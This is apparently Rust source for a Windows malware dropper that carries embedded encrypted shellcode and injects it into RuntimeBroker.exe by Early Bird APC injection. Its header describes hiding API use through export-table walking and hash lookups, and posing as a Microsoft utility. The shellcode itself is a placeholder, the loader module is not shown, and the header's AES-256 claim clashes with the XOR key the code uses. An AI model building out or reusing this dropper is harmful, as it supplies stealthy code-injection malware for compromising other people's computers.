//! Native Rust Dropper / Stager
//!
//! Features:
//! - AES-256 encrypted shellcode embedded statically
//! - Early Bird APC injection into RuntimeBroker.exe
//! - D/Invoke-style API resolution (EAT walking, DJB2 hashing)
//! - No IAT entries for sensitive APIs
//! - Looks like a legitimate Microsoft utility
//!
//! Build: cargo build --release --target x86_64-pc-windows-gnu

#![cfg_attr(not(windows), allow(dead_code))]

#[cfg(windows)]
mod dropper {
    use crate::loader::ReflectiveLoader;

    // Embedded XOR-encrypted shellcode placeholder
    // In real usage, replace with actual encrypted payload
    const SHELLCODE: &[u8] = &[
        0x90, 0x90, 0x90, 0x90, // NOP sled placeholder
        // ... actual encrypted shellcode bytes ...
    ];

    const XOR_KEY: &[u8] = b"M0N0L1TH_DROPPER_KEY_2026";

    pub fn run() -> bool {
        unsafe {
            let mut sc = SHELLCODE.to_vec();
            ReflectiveLoader::run_dropper(&mut sc, XOR_KEY).is_some()
        }
    }
}

#[cfg(not(windows))]
mod dropper {
    pub fn run() -> bool {
        false
    }
}

fn main() {
    let success = dropper::run();
    if !success {
        #[cfg(windows)]
        unsafe {
            use windows::Win32::UI::WindowsAndMessaging::{
                MessageBoxA, MB_ICONERROR, MB_OK,
            };
            let _ = MessageBoxA(
                None,
                "Initialization failed\0".as_ptr() as *const u8,
                "Error\0".as_ptr() as *const u8,
                MB_ICONERROR | MB_OK,
            );
        }
        std::process::exit(1);
    }
}
